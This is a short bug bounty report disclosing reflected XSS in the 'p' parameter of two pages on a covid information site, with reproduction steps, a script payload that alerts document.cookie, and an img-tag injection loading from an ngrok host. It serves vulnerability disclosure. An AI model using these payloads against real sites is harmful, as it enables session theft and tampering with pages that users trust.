Title: 
Reflected XSS

Description:
Hello Team,
I have found Reflected XSS vulnerabilities on:

https://covid.target.com/covid19?p= 
AND
https://covid.target.com/vaccineCentres?p=  


Steps To Reproduce:
1. visit below page: https://covid.target.com/covid19?p= 
2. in the p parameter inject below payload: <script>alert(document.cookie)</script>
3. Notic the pop-up with your cookies


POC1: 
https://covid.target.com/covid19?p=<script>alert(document.cookie)</script>

Source Code:
Line 465: <div id="freemarker_location" hidden><script>alert(document.cookie)</script></div>


POC2:
You can also inject image :
https://covid.target.com/covid19?p=</div><img src="https://111697rt098e.ngrok.io/Hacked2.jpg" width="" height="">  
